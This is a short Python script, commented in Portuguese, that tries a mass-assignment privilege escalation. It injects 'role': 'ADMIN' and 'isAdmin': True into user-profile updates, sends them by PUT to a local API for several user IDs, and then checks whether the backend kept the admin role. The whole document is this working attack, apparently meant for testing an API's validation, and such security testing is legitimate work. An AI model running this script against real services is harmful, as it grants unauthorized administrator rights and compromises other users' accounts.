import requests

def inject_admin_info(data):
  """Injeta as chaves 'role': 'ADMIN' e 'isAdmin': true em um dicionário JSON."""

  data.update({'role': 'ADMIN', 'isAdmin': True})
  return data

def send_updates_to_api(data, target_ids):
  """Envia os dados modificados para o endpoint da API."""

  for id in target_ids:
    url = f"http://localhost:8080/api/users/{id}"
    response = requests.put(url, json=inject_admin_info(data)) 

# Bloco C - Verificação de Validação
def validate_update_response(response):
  """Verifica se a chave 'role' retornada pelo backend é 'ADMIN'. """
  
  if response.json()['role'] != 'ADMIN':
    print("Falha de Validação Lógica Encontrada no Endpoint")

# Exemplo de Uso 
target_ids = ['user1', 'user2', 'user3'] # Lista de IDs para envio das atualizações
data = {}  # Dicionário JSON padrão de atualização de perfil de usuário
send_updates_to_api(data, target_ids)
validate_update_response(requests.get('http://localhost:8080/api/users/user1'))
